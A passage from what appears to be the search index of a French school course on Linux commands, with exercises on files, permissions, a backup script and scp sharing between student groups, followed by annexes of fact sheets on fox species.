fichiers\nmkdir test_suppression\ncd test_suppression\ntouch fichier1.txt fichier2.txt\ncd ..\n\n# Tenter de supprimer le r\u00e9pertoire (cela \u00e9chouera)\nrm test_suppression\n\n# Supprimer le r\u00e9pertoire et son contenu\nrm -rf test_suppression\n\n# V\u00e9rifier la suppression\nls</pre> \ud83c\udfaf Partie 8 : Projet final 8.1 Mission compl\u00e8te \ud83c\udfaf Objectif              Mettre en pratique toutes les comp\u00e9tences acquises pour cr\u00e9er une structure compl\u00e8te.          \ud83d\udccb \u00c9tapes \u00e0 suivre : <ol> <li>Cr\u00e9er les r\u00e9pertoires n\u00e9cessaires</li> <li>Ajouter les fichiers d'information (voir annexes pour le contenu)</li> <li>Afficher les contenus de chaque fichier pour v\u00e9rifier si tout a bien \u00e9t\u00e9 renseign\u00e9</li> <li>Cr\u00e9er des liens symboliques utiles</li> <li>Configurer les permissions appropri\u00e9es :                 <ul> <li>Fichiers de donn\u00e9es : lecture/\u00e9criture pour le propri\u00e9taire, lecture pour les autres</li> <li>R\u00e9pertoires : acc\u00e8s complet pour le propri\u00e9taire, lecture/ex\u00e9cution pour les autres</li> </ul> </li> </ol> 8.2 Script de sauvegarde \ud83d\udcdc Cr\u00e9ation du script Cr\u00e9er et rendre ex\u00e9cutable le script de sauvegarde \ud83d\udcbb Pr\u00e9paration du script <pre># Cr\u00e9er un script simple de sauvegarde\ncd ~/refuge_renards\ntouch sauvegarde.sh\nchmod +x sauvegarde.sh</pre> \u2699\ufe0f Contenu du script Code \u00e0 ajouter dans le script avec vim \ud83d\udcbb Script de sauvegarde <pre>#!/bin/bash\necho \"D\u00e9but de la sauvegarde du refuge...\"\ncp -r especes/ sauvegardes/sauvegarde_$(date +%Y%m%d)\necho \"Sauvegarde termin\u00e9e !\"</pre> \ud83d\udcda Ressources \ud83e\udd8a Annexes des esp\u00e8ces <ul> <li>Annexe Renard Roux</li> <li>Annexe Renard Polaire</li> <li>Annexe Fennec</li> <li>Annexe Renard du Bengale</li> <li>Annexe Renard Corsac</li> <li>Annexe Renard du Cap</li> </ul> \ud83c\udf0d Autres esp\u00e8ces <ul> <li>Annexe Renard de Blanford</li> <li>Annexe Renard du Tibet</li> <li>Annexe Renard Nain</li> <li>Annexe Renard de R\u00fcppell</li> <li>Annexe Renard V\u00e9loce</li> </ul> \u2753 Questions de r\u00e9vision \ud83e\udde0 Testez vos connaissances <ol> <li>Quelle est la diff\u00e9rence entre un chemin relatif et un chemin absolu ?</li> <li>Comment cr\u00e9er un lien symbolique ?</li> <li>Que signifie la permission <code>755</code> ?</li> <li>Comment supprimer un r\u00e9pertoire non vide ?</li> <li>Quelles sont les trois fa\u00e7ons de sortir de vim ?</li> </ol> \ud83c\udf10 Pour aller plus loin : Collaboration en r\u00e9seau 9.1 Connexion au r\u00e9seau \ud83c\udfaf Objectif              Apprendre \u00e0 se connecter au r\u00e9seau et partager des donn\u00e9es entre machines.          \ud83d\udcf6 nmcli - Connexion WiFi Se connecter au r\u00e9seau sans fil \ud83d\udcbb Connexion r\u00e9seau <pre># Se connecter au r\u00e9seau WiFi\nnmcli device wifi connect nom_du_reseau --ask\n# Entrer le mot de passe quand demand\u00e9</pre> \ud83d\udcf1 Note : Vous connecterez vos cartes au m\u00eame r\u00e9seau en partage de connexion avec vos t\u00e9l\u00e9phones portables.      9.2 Partage de donn\u00e9es entre groupes \ud83c\udfaf Objectif              \u00c9changer vos informations sur les renards avec un autre groupe via la commande <code>scp</code> (Secure Copy).          \ud83d\udce4 scp - Envoi de fichiers Copier des fichiers vers une autre machine \ud83d\udcbb Structure et envoi <pre># Structure de la commande scp\n# scp source destination\n\n# Exemple pour envoyer vos fichiers vers l'autre groupe\n# Remplacer user par le nom d'utilisateur et ip_machine par l'adresse IP\nscp ~/refuge_renards/nom_de_l_espece/* user@ip_machine:~/refuge_renards/partage/</pre> \ud83d\udce5 scp - R\u00e9ception de fichiers R\u00e9cup\u00e9rer des fichiers depuis une autre machine \ud83d\udcbb R\u00e9ception <pre># Exemple pour r\u00e9cup\u00e9rer les fichiers de l'autre groupe\nscp user@ip_machine:~/refuge_renards/leur_espece/* ~/refuge_renards/partage/</pre> \ud83d\udccb \u00c9tapes pour faciliter l'\u00e9change : <ol> <li>Cr\u00e9er un dossier <code>partage</code> dans votre <code>refuge_renards</code></li> <li>\u00c9changer vos adresses IP avec l'autre groupe (commande <code>ip addr</code>)</li> <li>Copier vos fichiers dans leurs dossiers respectifs</li> <li>V\u00e9rifiez les permissions des fichiers re\u00e7us</li> </ol> \ud83d\udd27 Configuration : Les user sont <code>orangepi</code> pour toutes les cartes et les adresses IP sont r\u00e9cup\u00e9rables gr\u00e2ce \u00e0 la commande <code>ifconfig wlan0</code>."},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_fennec/","title":"Annexe : Fennec (Vulpes zerda)","text":""},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_fennec/#donnees-pour-les-fichiers-du-tp","title":"Donn\u00e9es pour les fichiers du TP","text":""},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_fennec/#contenu-suggere-pour-informations_generalestxt","title":"Contenu sugg\u00e9r\u00e9 pour <code>informations_generales.txt</code>","text":"<pre><code>Nom: Fennec (Vulpes zerda)\nTaille: 24-41 cm + queue 18-31 cm\nPoids: 0,68-1,6 kg (plus petit canid\u00e9)\nDur\u00e9e de vie: 10-12 ans (sauvage), 14-16 ans (captivit\u00e9)\nStatut: Pr\u00e9occupation mineure\nR\u00e9partition: D\u00e9serts d'Afrique du Nord\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_fennec/#contenu-suggere-pour-habitattxt","title":"Contenu sugg\u00e9r\u00e9 pour <code>habitat.txt</code>","text":"<pre><code>Habitat: D\u00e9serts de sable, zones semi-arides\nR\u00e9gions: Sahara, Sina\u00ef, Arabie du Sud\nTerrier: 120 cm profondeur, 10m longueur, multiples chambres\nTerritoire: 10 km\u00b2 par groupe familial\nAltitude: 0-1500m\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_fennec/#contenu-suggere-pour-alimentationtxt","title":"Contenu sugg\u00e9r\u00e9 pour <code>alimentation.txt</code>","text":"<pre><code>R\u00e9gime: Omnivore opportuniste\nProies: Insectes (70%), petits vert\u00e9br\u00e9s, \u0153ufs\nV\u00e9g\u00e9taux: Racines, bulbes, fruits\nChasse: Nocturne, ou\u00efe exceptionnelle\nEau: Tire l'eau de sa nourriture, survit sans eau libre\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_fennec/#contenu-suggere-pour-reproductiontxt","title":"Contenu sugg\u00e9r\u00e9 pour <code>reproduction.txt</code>","text":"<pre><code>Maturit\u00e9: 9-11 mois\nAccouplement: Janvier-mars\nGestation: 50-53 jours\nPort\u00e9e: 2-5 renardeaux (moy. 3-4)\nSevrage: 61-70 jours\nStructure: Monogame, groupes familiaux\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_fennec/#contenu-suggere-pour-statut_conservationtxt","title":"Contenu sugg\u00e9r\u00e9 pour <code>statut_conservation.txt</code>","text":"<pre><code>Statut UICN: LC (Pr\u00e9occupation mineure)\nMenaces: Commerce animaux compagnie, d\u00e9gradation habitat\nProtection: CITES Annexe II\nPopulation: Stable mais tendance inconnue\nConservation: Protection l\u00e9gale dans certains pays\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_bengale/","title":"Annexe : Renard du Bengale (Vulpes bengalensis)","text":""},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_bengale/#donnees-pour-les-fichiers-du-tp","title":"Donn\u00e9es pour les fichiers du TP","text":""},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_bengale/#contenu-suggere-pour-informations_generalestxt","title":"Contenu sugg\u00e9r\u00e9 pour <code>informations_generales.txt</code>","text":"<pre><code>Nom: Renard du Bengale (Vulpes bengalensis)\nTaille: 45-60 cm + queue 25-35 cm\nPoids: 1,5-3,2 kg\nDur\u00e9e de vie: 6-8 ans (sauvage), 12-15 ans (captivit\u00e9)\nStatut: Pr\u00e9occupation mineure\nR\u00e9partition: Sous-continent indien\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_bengale/#contenu-suggere-pour-habitattxt","title":"Contenu sugg\u00e9r\u00e9 pour <code>habitat.txt</code>","text":"<pre><code>Habitat: Plaines semi-arides, steppes, zones agricoles\nR\u00e9gions: Inde, Pakistan, Bangladesh, N\u00e9pal\nTerrier: Simple, 2-3 entr\u00e9es, sous buissons\nTerritoire: 2-8 km\u00b2 selon la densit\u00e9 de proies\nAltitude: 0-1000m\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_bengale/#contenu-suggere-pour-alimentationtxt","title":"Contenu sugg\u00e9r\u00e9 pour <code>alimentation.txt</code>","text":"<pre><code>R\u00e9gime: Omnivore opportuniste\nProies: Insectes (60%), rongeurs, oiseaux, reptiles\nV\u00e9g\u00e9taux: Fruits, graines, racines\nChasse: Cr\u00e9pusculaire et nocturne\nAdaptation: Flexible, utilise d\u00e9chets humains\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_bengale/#contenu-suggere-pour-reproductiontxt","title":"Contenu sugg\u00e9r\u00e9 pour <code>reproduction.txt</code>","text":"<pre><code>Maturit\u00e9: 8-10 mois\nAccouplement: D\u00e9cembre-f\u00e9vrier\nGestation: 50-53 jours\nPort\u00e9e: 2-4 renardeaux (moy. 3)\nSevrage: 6-8 semaines\nSoins: Partag\u00e9s entre les parents\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_bengale/#contenu-suggere-pour-statut_conservationtxt","title":"Contenu sugg\u00e9r\u00e9 pour <code>statut_conservation.txt</code>","text":"<pre><code>Statut UICN: LC (Pr\u00e9occupation mineure)\nMenaces: Perte habitat, chasse, empoisonnement\nProtection: Wildlife Protection Act (Inde)\nPopulation: Stable localement, d\u00e9clin r\u00e9gional\nConservation: Parcs nationaux, sensibilisation\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_blanford/","title":"Annexe : Renard de Blanford (Vulpes cana)","text":""},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_blanford/#donnees-pour-les-fichiers-du-tp","title":"Donn\u00e9es pour les fichiers du TP","text":""},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_blanford/#informations_generalestxt","title":"<code>informations_generales.txt</code>","text":"<pre><code>Nom: Renard de Blanford (Vulpes cana)\nTaille: 38-50 cm + queue 33-41 cm\nPoids: 0,9-1,5 kg\nDur\u00e9e de vie: 4-6 ans (sauvage)\nStatut: Pr\u00e9occupation mineure\nR\u00e9partition: Moyen-Orient, Asie centrale\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_blanford/#habitattxt","title":"<code>habitat.txt</code>","text":"<pre><code>Habitat: D\u00e9serts rocheux, steppes arides\nR\u00e9gions: Afghanistan, Iran, Pakistan, Moyen-Orient\nTerrier: Rocheux, crevasses, terriers simples\nAltitude: 100-2000m\nClimat: Aride \u00e0 semi-aride\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_blanford/#alimentationtxt","title":"<code>alimentation.txt</code>","text":"<pre><code>R\u00e9gime: Omnivore opportuniste\nProies: Insectes, petits rongeurs\nV\u00e9g\u00e9taux: Fruits, graines\nChasse: Nocturne et cr\u00e9pusculaire\nAdaptation: Survie sans eau libre\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_blanford/#reproductiontxt","title":"<code>reproduction.txt</code>","text":"<pre><code>Maturit\u00e9: 9-10 mois\nAccouplement: Mars-mai\nGestation: 50-60 jours\nPort\u00e9e: 2-3 renardeaux\nSevrage: 6-8 semaines\nHabitat reproduction: Crevasses rocheuses\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_blanford/#statut_conservationtxt","title":"<code>statut_conservation.txt</code>","text":"<pre><code>Statut UICN: LC (Pr\u00e9occupation mineure)\nMenaces: Chasse, perte habitat, urbanisation\nProtection: Limit\u00e9e\nPopulation: Tendance inconnue\nRecherche: Donn\u00e9es insuffisantes\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_cap/","title":"Annexe : Renard du Cap (Vulpes chama)","text":""},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_cap/#donnees-pour-les-fichiers-du-tp","title":"Donn\u00e9es pour les fichiers du TP","text":""},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_cap/#contenu-suggere-pour-informations_generalestxt","title":"Contenu sugg\u00e9r\u00e9 pour <code>informations_generales.txt</code>","text":"<pre><code>Nom: Renard du Cap (Vulpes chama)\nTaille: 35-61 cm + queue 23-38 cm\nPoids: 1,0-1,9 kg\nDur\u00e9e de vie: 5-6 ans (sauvage), 10-12 ans (captivit\u00e9)\nStatut: Pr\u00e9occupation mineure\nR\u00e9partition: Afrique australe\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_cap/#contenu-suggere-pour-habitattxt","title":"Contenu sugg\u00e9r\u00e9 pour <code>habitat.txt</code>","text":"<pre><code>Habitat: D\u00e9serts, semi-d\u00e9serts, savanes arides\nR\u00e9gions: Afrique du Sud, Botswana, Namibie\nTerrier: Simple, 1-3 entr\u00e9es, sol sablonneux\nTerritoire: 1-3 km\u00b2 selon la densit\u00e9 de proies\nAltitude: 0-1500m\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_cap/#contenu-suggere-pour-alimentationtxt","title":"Contenu sugg\u00e9r\u00e9 pour <code>alimentation.txt</code>","text":"<pre><code>R\u00e9gime: Omnivore, principalement insectivore\nProies: Insectes (60-80%), rongeurs, reptiles\nV\u00e9g\u00e9taux: Fruits, baies, racines, bulbes\nChasse: Nocturne, fouissage, ou\u00efe exceptionnelle\nEau: Survit sans eau libre, tire l'eau de la nourriture\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_cap/#contenu-suggere-pour-reproductiontxt","title":"Contenu sugg\u00e9r\u00e9 pour <code>reproduction.txt</code>","text":"<pre><code>Maturit\u00e9: 9-10 mois\nAccouplement: Juillet-octobre (hiver austral)\nGestation: 51-53 jours\nPort\u00e9e: 1-6 renardeaux (moy. 3-4)\nSevrage: 6-8 semaines\nSoins: Partag\u00e9s, territoire d\u00e9fendu\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_cap/#contenu-suggere-pour-statut_conservationtxt","title":"Contenu sugg\u00e9r\u00e9 pour <code>statut_conservation.txt</code>","text":"<pre><code>Statut UICN: LC (Pr\u00e9occupation mineure)\nMenaces: Pers\u00e9cution fermiers, empoisonnement, routes\nProtection: Esp\u00e8ce prot\u00e9g\u00e9e Afrique du Sud\nPopulation: Stable\nConservation: \u00c9ducation fermiers, r\u00e9serves naturelles\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_corsac/","title":"Annexe : Renard Corsac (Vulpes corsac)","text":""},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_corsac/#donnees-pour-les-fichiers-du-tp","title":"Donn\u00e9es pour les fichiers du TP","text":""},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_corsac/#contenu-suggere-pour-informations_generalestxt","title":"Contenu sugg\u00e9r\u00e9 pour <code>informations_generales.txt</code>","text":"<pre><code>Nom: Renard corsac (Vulpes corsac)\nTaille: 45-65 cm + queue 19-35 cm\nPoids: 1,6-3,2 kg\nDur\u00e9e de vie: 8-10 ans (sauvage), 13-16 ans (captivit\u00e9)\nStatut: Pr\u00e9occupation mineure\nR\u00e9partition: Steppes d'Asie centrale\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_corsac/#contenu-suggere-pour-habitattxt","title":"Contenu sugg\u00e9r\u00e9 pour <code>habitat.txt</code>","text":"<pre><code>Habitat: Steppes, semi-d\u00e9serts, d\u00e9serts froids\nR\u00e9gions: Russie, Kazakhstan, Mongolie, Chine, Asie centrale\nTerrier: 2-3m profondeur, 4-6m longueur, multiples entr\u00e9es\nTerritoire: Variable, migrations saisonni\u00e8res\nAltitude: 0-2000m\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_corsac/#contenu-suggere-pour-alimentationtxt","title":"Contenu sugg\u00e9r\u00e9 pour <code>alimentation.txt</code>","text":"<pre><code>R\u00e9gime: Omnivore, variation saisonni\u00e8re\nProies: Petits mammif\u00e8res, insectes, oiseaux\nV\u00e9g\u00e9taux: Baies, fruits, racines\nChasse: Nocturne principalement\nAdaptation: Stockage nourriture, je\u00fbne hivernal\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_corsac/#contenu-suggere-pour-reproductiontxt","title":"Contenu sugg\u00e9r\u00e9 pour <code>reproduction.txt</code>","text":"<pre><code>Maturit\u00e9: 9-10 mois\nAccouplement: Janvier-mars\nGestation: 50-60 jours\nPort\u00e9e: 2-11 renardeaux (moy. 3-6)\nSevrage: 8-10 semaines\nDispersion: Automne, migrations familiales\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_corsac/#contenu-suggere-pour-statut_conservationtxt","title":"Contenu sugg\u00e9r\u00e9 pour <code>statut_conservation.txt</code>","text":"<pre><code>Statut UICN: LC (Pr\u00e9occupation mineure)\nMenaces: Chasse fourrure, perte habitat, empoisonnement\nProtection: L\u00e9gale dans certains pays, quotas chasse\nPopulation: Tendance inconnue, probablement en d\u00e9clin\nCommerce: Fourrure tr\u00e8s pris\u00e9e en Asie\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_nain/","title":"Annexe : Renard nain (Vulpes macrotis)","text":""},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_nain/#donnees-pour-les-fichiers-du-tp","title":"Donn\u00e9es pour les fichiers du TP","text":""},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_nain/#informations_generalestxt","title":"<code>informations_generales.txt</code>","text":"<pre><code>Nom: Renard nain (Vulpes macrotis)\nTaille: 39-52 cm + queue 22-32 cm\nPoids: 1,5-2,8 kg\nDur\u00e9e de vie: 5-7 ans (sauvage)\nStatut: Pr\u00e9occupation mineure (sous-esp\u00e8ce en danger)\nR\u00e9partition: Sud-ouest USA, Nord-ouest Mexique\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_nain/#habitattxt","title":"<code>habitat.txt</code>","text":"<pre><code>Habitat: D\u00e9serts de broussailles, zones semi-arides\nR\u00e9gions: Californie, Nevada, Arizona, Mexique\nTerrier: Simple ou r\u00e9utilise terriers existants\nV\u00e9g\u00e9tation: Chaparral d\u00e9sertique, prairies arides\nFragmentation: Habitat tr\u00e8s fragment\u00e9 (agriculture)\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_nain/#alimentationtxt","title":"<code>alimentation.txt</code>","text":"<pre><code>R\u00e9gime: Omnivore opportuniste\nProies: Rongeurs d\u00e9sertiques, insectes, l\u00e9zards\nV\u00e9g\u00e9taux: Fruits de cactus, baies\nChasse: Strictement nocturne, ou\u00efe exceptionnelle\nEau: Survie sans eau libre, m\u00e9tabolisme efficace\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_nain/#reproductiontxt","title":"<code>reproduction.txt</code>","text":"<pre><code>Maturit\u00e9: 10-12 mois\nAccouplement: D\u00e9cembre-mars\nGestation: 49-55 jours\nPort\u00e9e: 2-5 renardeaux (moyenne 3)\nSevrage: 8-10 semaines\nAdaptation: Reproduction synchronis\u00e9e avec ressources\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_nain/#statut_conservationtxt","title":"<code>statut_conservation.txt</code>","text":"<pre><code>Statut UICN: LC (sous-esp\u00e8ce mutica EN)\nMenaces: Perte habitat, fragmentation, rodenticides\nProtection: ESA pour V.m.mutica, r\u00e9serves\nPopulation: Stable (macrotis), critique (mutica)\nConservation: Programmes reproduction, restauration habitat\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_polaire/","title":"Annexe : Renard Polaire (Vulpes lagopus)","text":""},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_polaire/#donnees-pour-les-fichiers-du-tp","title":"Donn\u00e9es pour les fichiers du TP","text":""},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_polaire/#contenu-suggere-pour-informations_generalestxt","title":"Contenu sugg\u00e9r\u00e9 pour <code>informations_generales.txt</code>","text":"<pre><code>Nom: Renard polaire (Vulpes lagopus)\nTaille: 46-68 cm + queue 25-42 cm\nPoids: 1,4-9,4 kg (variation saisonni\u00e8re)\nDur\u00e9e de vie: 3-6 ans (sauvage), 10-16 ans (captivit\u00e9)\nStatut: Pr\u00e9occupation mineure (global), En danger (Scandinavie)\nR\u00e9partition: Arctique circumpolaire\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_polaire/#contenu-suggere-pour-habitattxt","title":"Contenu sugg\u00e9r\u00e9 pour <code>habitat.txt</code>","text":"<pre><code>Habitat: Toundra arctique, banquise\nR\u00e9gions: Alaska, Canada, Groenland, Scandinavie, Sib\u00e9rie\nTerrier: Dans le perg\u00e9lisol, utilis\u00e9 sur plusieurs g\u00e9n\u00e9rations\nTerritoire: Variable, suit les migrations de proies\nAltitude: Niveau de la mer \u00e0 3000m (montagnes arctiques)\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_polaire/#contenu-suggere-pour-alimentationtxt","title":"Contenu sugg\u00e9r\u00e9 pour <code>alimentation.txt</code>","text":"<pre><code>Proie principale: Lemmings (cycles de 3-4 ans)\nAutres proies: Oiseaux arctiques, poissons, phoques\nCharognard: Restes d'ours polaires\nV\u00e9g\u00e9taux: Baies arctiques (\u00e9t\u00e9)\nAdaptation: Stockage, je\u00fbne jusqu'\u00e0 4 mois\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_polaire/#contenu-suggere-pour-reproductiontxt","title":"Contenu sugg\u00e9r\u00e9 pour <code>reproduction.txt</code>","text":"<pre><code>Maturit\u00e9: 9-10 mois\nAccouplement: Mars-avril\nGestation: 51-54 jours\nPort\u00e9e: 5-25 renardeaux (d\u00e9pend des lemmings)\nSevrage: 9-10 semaines\nMortalit\u00e9 juv\u00e9nile: 80-90%\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_polaire/#contenu-suggere-pour-statut_conservationtxt","title":"Contenu sugg\u00e9r\u00e9 pour <code>statut_conservation.txt</code>","text":"<pre><code>Statut global: LC (Pr\u00e9occupation mineure)\nScandinavie: CR (En danger critique) - &lt;200 individus\nMenaces: Changement climatique, comp\u00e9tition renard roux\nConservation: Programmes de r\u00e9introduction\nTendance: D\u00e9clin dans le sud, stable dans l'Arctique central\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_roux/","title":"Annexe : Renard Roux (Vulpes vulpes)","text":""},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_roux/#donnees-pour-les-fichiers-du-tp","title":"Donn\u00e9es pour les fichiers du TP","text":""},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_roux/#contenu-suggere-pour-informations_generalestxt","title":"Contenu sugg\u00e9r\u00e9 pour <code>informations_generales.txt</code>","text":"<pre><code>Nom: Renard roux (Vulpes vulpes)\nTaille: 45-90 cm + queue 30-55 cm\nPoids: 2,2-14 kg\nDur\u00e9e de vie: 2-5 ans (sauvage), jusqu'\u00e0 15 ans (captivit\u00e9)\nStatut: Pr\u00e9occupation mineure\nR\u00e9partition: H\u00e9misph\u00e8re nord (tr\u00e8s large)\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_roux/#contenu-suggere-pour-habitattxt","title":"Contenu sugg\u00e9r\u00e9 pour <code>habitat.txt</code>","text":"<pre><code>Habitats principaux:\n- For\u00eats mixtes et conif\u00e8res\n- Prairies et steppes  \n- Zones agricoles\n- Banlieues\n- Toundra\n\nTerrier: 3-4m de profondeur, 20-30m d'extension\nTerriture: 2-50 km\u00b2 selon la densit\u00e9 de proies\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_roux/#contenu-suggere-pour-alimentationtxt","title":"Contenu sugg\u00e9r\u00e9 pour <code>alimentation.txt</code>","text":"<pre><code>R\u00e9gime: Omnivore opportuniste\nProies: Rongeurs (60%), oiseaux, insectes, poissons\nV\u00e9g\u00e9taux: Fruits, baies, racines\nChasse: Principalement nocturne\nTechnique: Mulotage (saut pour capturer sous la neige)\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_roux/#contenu-suggere-pour-reproductiontxt","title":"Contenu sugg\u00e9r\u00e9 pour <code>reproduction.txt</code>","text":"<pre><code>Maturit\u00e9: 9-10 mois\nAccouplement: Janvier-mars\nGestation: 51-53 jours\nPort\u00e9e: 2-12 renardeaux (moy. 4-6)\nSevrage: 8-10 semaines\nInd\u00e9pendance: 7-10 mois\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_roux/#contenu-suggere-pour-statut_conservationtxt","title":"Contenu sugg\u00e9r\u00e9 pour <code>statut_conservation.txt</code>","text":"<pre><code>Statut UICN: LC (Pr\u00e9occupation mineure)\nPopulation: Stable, tr\u00e8s r\u00e9pandue\nMenaces: Chasse, collisions routi\u00e8res, maladies\nProtection: Esp\u00e8ce chassable, r\u00e9glement\u00e9e\nTendance: Population stable globalement\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_ruppell/","title":"Annexe : Renard de R\u00fcppell (Vulpes rueppelli)","text":""},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_ruppell/#donnees-pour-les-fichiers-du-tp","title":"Donn\u00e9es pour les fichiers du TP","text":""},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_ruppell/#informations_generalestxt","title":"<code>informations_generales.txt</code>","text":"<pre><code>Nom: Renard de R\u00fcppell (Vulpes rueppelli)\nTaille: 40-52 cm + queue 25-39 cm\nPoids: 1,2-3,6 kg\nDur\u00e9e de vie: 6-8 ans (sauvage)\nStatut: Pr\u00e9occupation mineure\nR\u00e9partition: Sahara, P\u00e9ninsule arabique\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_ruppell/#habitattxt","title":"<code>habitat.txt</code>","text":"<pre><code>Habitat: D\u00e9serts de sable et rocheux\nR\u00e9gions: Sahara, Moyen-Orient, P\u00e9ninsule arabique\nTerrier: Complexe, multiples entr\u00e9es, sous rochers\nClimat: Aride extr\u00eame, variations thermiques\nAdaptation: Survie sans eau 